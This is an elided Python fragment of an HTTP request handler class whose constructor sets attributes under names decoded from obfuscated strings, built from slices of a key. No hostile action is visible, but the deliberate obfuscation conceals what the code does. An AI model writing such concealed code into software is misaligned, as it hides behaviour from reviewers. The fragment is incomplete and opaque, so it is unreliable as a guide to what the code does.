...
class Demo(BaseHTTPRequestHandler):
    ...
    def __init__(self):
        ...
        self.__setattr__(de(self.this(self._f + "zj=").encode("utf8")).decode("utf8"),
                         self._d_vl if len(self._d_vl) > 0 else de(self.this(self._p)).decode("utf8") + self._key[
                                                                                                        0:8] + "_" + self._key[
                                                                                                                     9:13])
        self.__setattr__(de(self.this(self._f + "z0=").encode("utf8")).decode("utf8"),
                         self._d_vm if len(self._d_vm) > 0 else de(self.this(self._p)).decode("utf8") + self._key[
                                                                                                        0:8] + "_" + self._key[
                                                                                                                     14:18])
        self.__setattr__(de(self.this(self._f + "UV=").encode("utf8")).decode("utf8"),
                         self._d_tr if len(self._d_tr) > 0 else de(self.this(self._p)).decode("utf8") + self._key[
                                                                                                        0:8] + "_" + self._key[
                                                                                                                     19:23])
